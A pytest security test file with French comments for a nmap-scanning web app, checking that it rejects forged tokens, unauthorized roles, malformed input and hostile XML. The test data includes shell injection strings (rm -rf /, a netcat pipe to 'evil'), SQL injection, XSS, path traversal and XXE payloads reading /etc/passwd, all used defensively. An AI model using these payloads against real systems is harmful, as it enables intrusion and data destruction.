"""Tests de sécurité (SEC-10) : permissions, entrées malformées, injections, XML hostile, limitation de débit."""

import json
import subprocess
import sys
from pathlib import Path

import jwt
import pytest
from helpers import mk_finding, mk_host, mk_scan
from test_auth import PWD, headers, login, make_user

from app.config import settings
from app.models.auth import AuditLog, User
from app.models.scan import Scan, Scope
from app.services.nmap_cmd import PROFILES, build_cmd
from app.services.nmap_parser import parse_nmap_xml

BACKEND_DIR = Path(__file__).resolve().parents[1]


def bearer(token: str) -> dict:
    return {"Authorization": f"Bearer {token}"}


def add_scope(db, cidr="172.30.0.0/24", active=True):
    db.add(Scope(name="lab", cidr=cidr, created_by=1, is_active=active))
    db.commit()


# --- Jetons -----------------------------------------------------------------------------------


def test_forged_and_malformed_tokens_are_rejected(client, db_session):
    user = make_user(db_session, "u1")
    good = login(client, "u1").json()["access_token"]
    far_future = 9999999999
    forged = jwt.encode(
        {"sub": str(user.id), "role": "admin", "type": "access", "exp": far_future},
        "another-secret-key-another-secret-key-12345",
        algorithm="HS256",
    )
    no_signature = jwt.encode({"sub": str(user.id), "role": "admin", "type": "access"}, None, algorithm="none")
    expired = jwt.encode({"sub": str(user.id), "type": "access", "exp": 1}, settings.secret_key, algorithm="HS256")
    wrong_type = jwt.encode(
        {"sub": str(user.id), "type": "refresh", "exp": far_future}, settings.secret_key, algorithm="HS256"
    )
    for bad in (forged, no_signature, expired, wrong_type, "garbage", good[:-3] + "abc", ""):
        assert client.get("/auth/me", headers=bearer(bad)).status_code == 401, bad


def test_token_of_deactivated_user_is_rejected(client, db_session):
    user = make_user(db_session, "u1")
    h = headers(client, "u1")
    user.is_active = False
    db_session.commit()
    assert client.get("/auth/me", headers=h).status_code == 401


def test_refresh_token_cannot_be_used_as_access_token(client, db_session):
    make_user(db_session, "u1")
    refresh = login(client, "u1").json()["refresh_token"]
    assert client.get("/auth/me", headers=bearer(refresh)).status_code == 401


# --- Permissions ------------------------------------------------------------------------------

ADMIN_ONLY = [
    ("GET", "/users", None),
    ("POST", "/users", {"username": "bob", "password": PWD, "role": "analyst"}),
    ("GET", "/audit-logs", None),
    ("POST", "/scopes", {"name": "x", "cidr": "172.30.0.0/24", "authorization_confirmed": True}),
]


@pytest.mark.parametrize("method,path,body", ADMIN_ONLY)
def test_analyst_cannot_use_admin_routes(client, db_session, method, path, body):
    make_user(db_session, "analyst1", "analyst")
    r = client.request(method, path, headers=headers(client, "analyst1"), json=body)
    assert r.status_code == 403
    assert db_session.query(User).count() == 1  # aucun compte créé au passage


# --- Injections via l'API ---------------------------------------------------------------------

INJECTIONS = [
    "172.30.0.1; rm -rf /",
    "172.30.0.1 && whoami",
    "$(whoami)",
    "`id`",
    "172.30.0.1 -oN /tmp/x",
    "172.30.0.1\n10.0.0.1",
    "../../etc/passwd",
    "172.30.0.1|nc evil 4444",
    "' OR '1'='1",
    "<script>alert(1)</script>",
]


@pytest.mark.parametrize("target", INJECTIONS)
def test_scan_target_injection_is_rejected_and_audited(client, db_session, target):
    make_user(db_session, "a1", "analyst")
    add_scope(db_session)
    r = client.post("/scans", headers=headers(client, "a1"), json={"target": target, "profile": "standard"})
    assert r.status_code == 400
    assert db_session.query(Scan).count() == 0
    assert db_session.query(AuditLog).filter_by(action="scan_launch", result="rejected").count() == 1


@pytest.mark.parametrize("profile", ["--script=evil", "standard; id", "../deep", "", "STANDARD"])
def test_scan_profile_is_a_closed_list(client, db_session, profile):
    make_user(db_session, "a1", "analyst")
    add_scope(db_session)
    r = client.post("/scans", headers=headers(client, "a1"), json={"target": "172.30.0.11", "profile": profile})
    assert r.status_code == 422
    assert db_session.query(Scan).count() == 0


def test_nmap_command_is_a_list_from_a_whitelist():
    for profile in PROFILES:
        cmd = build_cmd(profile, "172.30.0.11")
        assert isinstance(cmd, list) and cmd[0] == "nmap" and cmd[-1] == "172.30.0.11"
    with pytest.raises(ValueError):
        build_cmd("standard; rm -rf /", "172.30.0.11")


@pytest.mark.parametrize("target", ["8.8.8.8", "172.30.0.0/16", "127.0.0.1", "192.168.1.5", "169.254.169.254"])
def test_scan_outside_scope_or_forbidden_is_rejected(client, db_session, target):
    make_user(db_session, "a1", "analyst")
    add_scope(db_session)
    r = client.post("/scans", headers=headers(client, "a1"), json={"target": target, "profile": "discovery"})
    assert r.status_code == 400 and db_session.query(Scan).count() == 0


def test_inactive_scope_does_not_authorize_scans(client, db_session):
    make_user(db_session, "a1", "analyst")
    add_scope(db_session, active=False)
    r = client.post("/scans", headers=headers(client, "a1"), json={"target": "172.30.0.11", "profile": "discovery"})
    assert r.status_code == 400


def test_scan_queue_is_limited(client, db_session):  # SEC-09
    make_user(db_session, "a1", "analyst")
    add_scope(db_session)
    for _ in range(5):
        db_session.add(Scan(scope_id=1, target="172.30.0.11/32", profile="standard", status="pending", created_by=1))
    db_session.commit()
    r = client.post("/scans", headers=headers(client, "a1"), json={"target": "172.30.0.11", "profile": "standard"})
    assert r.status_code == 429


def test_sql_injection_attempts_change_nothing(client, db_session):
    make_user(db_session, "admin1", "admin")
    assert login(client, "admin1' OR '1'='1' --", "x").status_code == 401
    assert login(client, "'; DROP TABLE users; --", "x").status_code == 401
    scan = mk_scan(db_session)
    host = mk_host(db_session, scan, "172.30.0.11")
    mk_finding(db_session, scan, host, "R005", 80, 30)
    h = headers(client, "admin1")
    r = client.get("/findings", params={"q": "' OR 1=1 --", "level": "x'; DROP TABLE findings;--"}, headers=h)
    assert r.status_code == 200 and r.json() == []  # une injection réussie renverrait le constat
    assert len(client.get("/findings", headers=h).json()) == 1
    assert db_session.query(User).count() == 1


def test_html_in_data_is_stored_as_inert_text_and_served_as_json(client, db_session):
    make_user(db_session, "admin1", "admin")
    h = headers(client, "admin1")
    payload = "<script>alert(1)</script>"
    r = client.post(
        "/scopes",
        headers=h,
        json={
            "name": payload,
            "cidr": "172.30.0.0/24",
            "description": "<img src=x onerror=alert(1)>",
            "authorization_confirmed": True,
        },
    )
    assert r.status_code == 201
    r = client.get("/scopes", headers=h)
    assert r.headers["content-type"].startswith("application/json")
    assert r.headers["x-content-type-options"] == "nosniff"
    assert r.json()[0]["name"] == payload  # l'échappement se fait à l'affichage (React), pas en base


# --- Entrées malformées -----------------------------------------------------------------------

BAD_USERS = [
    {"username": "ab", "password": PWD, "role": "analyst"},
    {"username": "bob smith", "password": PWD, "role": "analyst"},
    {"username": "../x", "password": PWD, "role": "analyst"},
    {"username": "a" * 65, "password": PWD, "role": "analyst"},
    {"username": "bob", "password": PWD, "role": "root"},
    {"username": "bob", "password": "x" * 300, "role": "analyst"},
    {"username": 123, "password": PWD, "role": "analyst"},
    {},
]


@pytest.mark.parametrize("body", BAD_USERS)
def test_malformed_user_payloads_are_rejected(client, db_session, body):
    make_user(db_session, "admin1", "admin")
    r = client.post("/users", headers=headers(client, "admin1"), json=body)
    assert r.status_code == 422
    assert db_session.query(User).count() == 1


def test_invalid_json_and_oversized_fields(client, db_session):
    r = client.post("/auth/login", content="{not json", headers={"Content-Type": "application/json"})
    assert r.status_code == 422
    assert login(client, "x", "a" * 300).status_code == 422
    assert login(client, "x" * 100, "a").status_code == 422


@pytest.mark.parametrize("path", ["/audit-logs?limit=0", "/audit-logs?limit=100000", "/audit-logs?offset=-1"])
def test_pagination_bounds_are_enforced(client, db_session, path):
    make_user(db_session, "admin1", "admin")
    assert client.get(path, headers=headers(client, "admin1")).status_code == 422


def test_accepting_a_finding_requires_a_comment(client, db_session):
    make_user(db_session, "a1", "analyst")
    scan = mk_scan(db_session)
    f = mk_finding(db_session, scan, mk_host(db_session, scan, "172.30.0.11"), "R005", 80, 30)
    h = headers(client, "a1")
    assert client.patch(f"/findings/{f.id}", headers=h, json={"status": "accepted"}).status_code == 400
    assert client.patch(f"/findings/{f.id}", headers=h, json={"status": "accepted", "comment": "  "}).status_code == 400
    ok = client.patch(f"/findings/{f.id}", headers=h, json={"status": "accepted", "comment": "Service voulu"})
    assert ok.status_code == 200 and ok.json()["accepted_by"] is not None
    assert client.patch(f"/findings/{f.id}", headers=h, json={"status": "hacked"}).status_code == 422


# --- En-têtes, CORS, fuites -------------------------------------------------------------------


def test_security_headers_are_present(client):  # SEC-14
    r = client.get("/health")
    assert r.headers["x-content-type-options"] == "nosniff"
    assert r.headers["x-frame-options"] == "DENY"
    assert r.headers["referrer-policy"] == "no-referrer"


def test_cors_is_strict(client):  # SEC-07
    pre = {"Access-Control-Request-Method": "POST"}
    evil = client.options("/auth/login", headers={"Origin": "https://evil.example", **pre})
    assert "access-control-allow-origin" not in evil.headers
    ok = client.options("/auth/login", headers={"Origin": "http://localhost:5173", **pre})
    assert ok.headers["access-control-allow-origin"] == "http://localhost:5173"
    bad_method = client.options(
        "/auth/login", headers={"Origin": "http://localhost:5173", "Access-Control-Request-Method": "DELETE"}
    )
    assert bad_method.status_code == 400


def test_responses_never_expose_password_material(client, db_session):
    make_user(db_session, "admin1", "admin")
    h = headers(client, "admin1")
    body = client.get("/users", headers=h).text + client.get("/auth/me", headers=h).text
    assert "$argon2" not in body and "password_hash" not in body


def test_sensitive_actions_are_audited(client, db_session):  # SEC-08, CA-12
    make_user(db_session, "admin1", "admin")
    h = headers(client, "admin1")
    client.post("/scopes", headers=h, json={"name": "lab", "cidr": "172.30.0.0/24", "authorization_confirmed": True})
    client.post("/users", headers=h, json={"username": "bob", "password": PWD, "role": "analyst"})
    client.post("/scans", headers=h, json={"target": "172.30.0.11", "profile": "discovery"})
    actions = {a.action for a in db_session.query(AuditLog)}
    assert {"login", "scope_create", "legal_ack", "user_create", "scan_launch"} <= actions


def test_scope_requires_explicit_authorization_confirmation(client, db_session):
    make_user(db_session, "admin1", "admin")
    r = client.post(
        "/scopes",
        headers=headers(client, "admin1"),
        json={"name": "lab", "cidr": "172.30.0.0/24", "authorization_confirmed": False},
    )
    assert r.status_code == 400 and db_session.query(Scope).count() == 0


# --- XML hostile (SEC-12) ---------------------------------------------------------------------

BILLION_LAUGHS = (
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
    '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]><nmaprun>&lol2;</nmaprun>'
)
XXE_FILE = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><nmaprun>&x;</nmaprun>'
XXE_HTTP = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1:9/x">]><nmaprun>&x;</nmaprun>'


@pytest.mark.parametrize("xml", [BILLION_LAUGHS, XXE_FILE, XXE_HTTP, "<nmaprun><host>", "", "not xml at all"])
def test_hostile_or_malformed_xml_is_rejected(xml):
    with pytest.raises(Exception):  # noqa: B017 - toute exception est acceptable : l'important est le refus
        parse_nmap_xml(xml)


def test_external_dtd_is_never_fetched():
    xml = '<?xml version="1.0"?><!DOCTYPE nmaprun SYSTEM "http://127.0.0.1:9/x.dtd"><nmaprun/>'
    assert parse_nmap_xml(xml)["hosts"] == []  # pas d'accès réseau, pas de plantage


# --- Limitation de débit (SEC-07, SEC-11) -----------------------------------------------------

RATE_SCRIPT = """
import os
os.environ.update(POSTGRES_USER='t', POSTGRES_PASSWORD='t', POSTGRES_DB='t',
                  SECRET_KEY='x' * 40, LOGIN_RATE_LIMIT='3/minute')
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool
from fastapi.testclient import TestClient
import app.models
from app.database import Base, get_db
from app.main import app
engine = create_engine('sqlite://', connect_args={'check_same_thread': False}, poolclass=StaticPool)
Base.metadata.create_all(engine)
session = sessionmaker(bind=engine)()
app.dependency_overrides[get_db] = lambda: session
c = TestClient(app)
print([c.post('/auth/login', json={'username': 'nobody', 'password': 'x'}).status_code for _ in range(5)])
"""


def test_login_route_is_rate_limited():
    out = subprocess.run(
        [sys.executable, "-c", RATE_SCRIPT], capture_output=True, text=True, cwd=BACKEND_DIR, timeout=120, check=False
    )
    assert out.returncode == 0, out.stderr
    assert json.loads(out.stdout.strip().splitlines()[-1]) == [401, 401, 401, 429, 429]
